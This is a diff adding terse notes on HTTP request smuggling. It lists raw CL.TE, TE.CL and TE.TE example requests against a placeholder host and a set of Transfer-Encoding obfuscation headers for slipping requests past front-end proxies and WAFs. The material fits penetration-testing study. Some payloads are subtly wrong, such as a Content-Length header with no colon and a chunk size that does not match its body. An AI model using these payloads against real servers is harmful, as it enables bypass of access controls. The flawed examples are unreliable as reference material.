@@ -1,0 +1,60 @@
+HTTP Request Smuggling
+
+E.G.
+	POST / HTTP/1.1
+	Host: target.dom
+	...
+	
+	0
+	GET /sensitive HTTP/1.1
+	Host: target.dom
+
+	--forwards (smuggles) appended secondary request to secondary HTTP server
+		--e.g. secondary request may bypass WAF protecting an initial load balancer or reverse proxy
+		--ambiguous requests may be interpreted differently by back-end servers
+	
+Bypass techniques:
+	Carraige Return
+		arbitray carraige returns interpreted independent of linefeeds
+	Content-Length header
+		--intended to specify length of message body (in bytes)
+	Transfer-Encoding header
+		specify message body use of chunked encoding, message body contains one or more chucks of data (in bytes, as hexidecimal) followed by linefeed/CRLF, followed by chunk contents
+	--content-length and transfer-encoding are the two methods described by HTTP specifications
+	CL.TE
+		use when: front-end server uses Content-Length header, back-end server uses Transfer-Encoding header
+POST / HTTP/1.1
+Host: target.dom
+Content-Length 13
+Transfer-Encoding: chunked
+
+0
+
+smuggler
+	TE.CL
+		use when: front-end server uses Transfer-Encoding header, back-end server uses Content-Length header
+POST / HTTP/1.1
+Host: target.dom
+Content-Length 13
+Transfer-Encoding: chunked
+
+1
+smuggler
+0
+	TE.TE
+		use when: front- and back-end servers both support Transfer-Encoding header
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
